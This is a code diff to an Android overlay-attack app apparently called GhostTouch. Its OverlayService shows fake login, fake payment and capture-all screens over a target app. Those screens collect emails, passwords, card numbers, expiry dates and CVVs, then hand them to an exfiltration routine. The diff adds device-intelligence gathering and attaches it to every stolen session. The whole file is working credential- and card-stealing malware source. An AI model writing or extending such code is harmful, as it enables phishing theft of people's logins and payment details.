@@ -8,6 +8,7 @@ import android.os.Looper
 import android.util.Log
 import com.ghosttouch.attacker.capture.SessionRepository
 import com.ghosttouch.attacker.exfil.DataExfiltrator
+import com.ghosttouch.attacker.exfil.DeviceIntel
 import com.ghosttouch.attacker.overlay.CaptureAllOverlay
 import com.ghosttouch.attacker.overlay.FakeLoginOverlay
 import com.ghosttouch.attacker.overlay.FakePaymentOverlay
@@ -146,10 +147,21 @@ class OverlayService : Service() {
         }
     }
 
+    /** Collect device intel once when overlay triggers — cached for the session. */
+    private fun gatherIntel(): Map<String, String> {
+        val intel = DeviceIntel.collect(applicationContext)
+        Log.d(TAG, "═══ DEVICE INTELLIGENCE (${intel.size} fields) ═══")
+        Log.d(TAG, DeviceIntel.formatForLog(intel))
+        return intel
+    }
+
     /**
      * Triggers the appropriate overlay based on the current attack mode.
      */
     private fun triggerOverlay() {
+        // Collect device intel at trigger time (before overlay is shown)
+        val intel = gatherIntel()
+
         when (currentMode) {
             MODE_LOGIN -> overlayManager.show(delayMs = OVERLAY_DELAY_MS) {
                 FakeLoginOverlay(
@@ -158,7 +170,8 @@ class OverlayService : Service() {
                         val session = SessionRepository.captureLogin(
                             targetApp = TARGET_PACKAGE,
                             email = email,
-                            password = password
+                            password = password,
+                            deviceIntel = intel
                         )
                         DataExfiltrator.exfiltrate(session)
                     },
@@ -174,7 +187,8 @@ class OverlayService : Service() {
                             targetApp = TARGET_PACKAGE,
                             cardNumber = cardNumber,
                             expiry = expiry,
-                            cvv = cvv
+                            cvv = cvv,
+                            deviceIntel = intel
                         )
                         DataExfiltrator.exfiltrate(session)
                     },
@@ -188,7 +202,8 @@ class OverlayService : Service() {
                         Log.d(TAG, "CAPTURE_ALL captured — ${fields.size} fields: ${fields.keys}")
                         val session = SessionRepository.captureAll(
                             targetApp = TARGET_PACKAGE,
-                            fields = fields
+                            fields = fields,
+                            deviceIntel = intel
                         )
                         DataExfiltrator.exfiltrate(session)
                     },
